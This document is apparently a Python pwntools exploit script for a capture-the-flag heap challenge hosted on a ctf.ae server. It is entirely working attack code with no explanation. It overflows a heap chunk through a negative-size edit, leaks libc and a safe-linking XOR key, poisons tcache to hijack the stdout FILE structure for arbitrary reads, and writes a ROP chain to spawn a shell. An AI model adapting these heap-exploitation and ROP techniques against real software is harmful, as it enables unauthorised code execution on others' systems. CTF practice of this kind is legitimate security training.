from pwn import *
import time
#proc = process("./chall")
proc = remote("07c0939a01df85aa.chal.ctf.ae", 443, ssl=True)
#proc = remote("172.17.0.2", 5050)
context.arch = 'amd64'
context.log_level = "critical"
context.log_level = "debug"

def unp64(x):
	return int.from_bytes(x, "little")



def petAdd(nameSize, name='', age=1337, gender="", hobby="", sound="", io="recv"):
	if io == "recv":
		proc.sendline(b'1')
		proc.recvuntil(b"Size of name: ")
		proc.sendline(str(nameSize))
		proc.recvuntil(b"Name pet: ")
		proc.sendline(name)
		proc.recvuntil(b"Age pet: ")
		proc.sendline(str(age))
		proc.recvuntil(b"Gender (M/F): ")
		proc.sendline(gender)
		proc.recvuntil(b'Hobby: ')
		proc.sendline(hobby)
		proc.recvuntil(b"Sound: ")
		proc.sendline(sound)
		proc.recvuntil(b">>>")
	elif io == "sleep":
		proc.sendline(b'1')
		time.sleep(0.1)
		proc.sendline(str(nameSize))
		time.sleep(0.1)
		proc.sendline(name)
		time.sleep(0.1)
		proc.sendline(str(age))
		time.sleep(0.1)
		proc.sendline(gender)
		time.sleep(0.1)
		proc.sendline(hobby)
		time.sleep(0.1)
		proc.sendline(sound)
		time.sleep(0.1)

def petShow(idx):
	proc.sendline(b'3')
	time.sleep(0.1)
	proc.sendline(str(idx))
	time.sleep(0.1)
	proc.recvuntil(b"Name: ")
	time.sleep(0.1)
	name = proc.recvuntil(b"Age")[:-6]
	proc.recvuntil(b">>>")
	return name

def petEdit(idx, nameLen, name, unsafe=False):
	print("Editing pet " + str(idx))
	proc.sendline(b'4')
	time.sleep(0.1)
	proc.sendline(str(idx))
	time.sleep(0.1)
	proc.sendline(str(nameLen))
	time.sleep(0.1)
	if not unsafe: 
		proc.recvuntil(b"Enter name to read: ")
	time.sleep(0.1)
	proc.sendline(name)
	time.sleep(0.1)
	if not unsafe:
		proc.recvuntil(b">>>")

def petFree(idx):
	proc.sendline(b'5')
	proc.sendline(str(idx))
	proc.recvuntil(b">>>")



petAdd(64)
petAdd(1048)
petAdd(64)


#Overwrite chunk
padding = b'a' * 0x48
newSize = 0x471
petEdit(0, -1, (padding + p64(newSize)))
petFree(1)
petAdd(1048)
petAdd(1048)
petAdd(1048)

petFree(3)

libcLeak = unp64(petShow(2))

stdoutStruct = libcLeak + 0xaa0
stdinStruct = libcLeak - 0x240


libcArgv = libcLeak + 0xbc0



print("Libc leak: " + hex(libcLeak))
input()
petFree(4)
petAdd(64)

petFree(3)
xorKey = unp64(petShow(2))
print("XOR key: " + hex(xorKey))
petAdd(64)
petAdd(64)

petFree(4)
petFree(3)

nextPtr = p64(stdoutStruct ^ xorKey)

petEdit(2, -1, nextPtr)

print("Stdout struct at " + hex(stdoutStruct))
print("Allocating stdout struct...")
petAdd(64)
petAdd(64, io="sleep")


def arbRead(addr, size):
	fileStruct = FileStructure()
	fileStruct.flags = 0xfbad1807
	payload = fileStruct.write(addr=addr, size=size)
	petEdit(4, 64, payload, unsafe=True)
	#proc.recvuntil(b"Size of name: ")
	return proc.recvuntil(b"====")[:-5][-7:]


stackLeak = unp64(arbRead(libcArgv, 8))

binLeakAddr = stackLeak -0x140;

print("Stack leak: " + hex(stackLeak))
proc.recvuntil(b">>>")
challLeak = unp64(arbRead(binLeakAddr, 8))
proc.recvuntil(b">>>")

pets = challLeak + 0x2ecb



petAdd(64)

petFree(5)
petFree(3)

nextPtr = p64(pets ^ xorKey)

print("Pets objects stored at: " + hex(pets))

petEdit(2, 8, nextPtr)

petAdd(64)
petAdd(64)




print("Chall leak:" + hex(challLeak))

savedRbp = stackLeak -0x148
system = libcLeak -0x1ab3d0
popRdi = libcLeak -0xf43c5
popRsi = libcLeak -0xf30d3
binsh = libcLeak -0x386f1
nop = libcLeak -0x16a601
ropchain = p64(0)+ p64(nop) + p64(popRdi)+ p64(binsh) + p64(popRsi) + p64(0) + p64(system)
print("Saved rbp: " + hex(savedRbp))
print(ropchain)
petEdit(5, -1, p64(savedRbp) + p64(64))
petEdit(0, 64, ropchain, unsafe=True)

#print(hex(binsh))
#print(hex(unp64(arbRead(system, 8))))


proc.interactive()
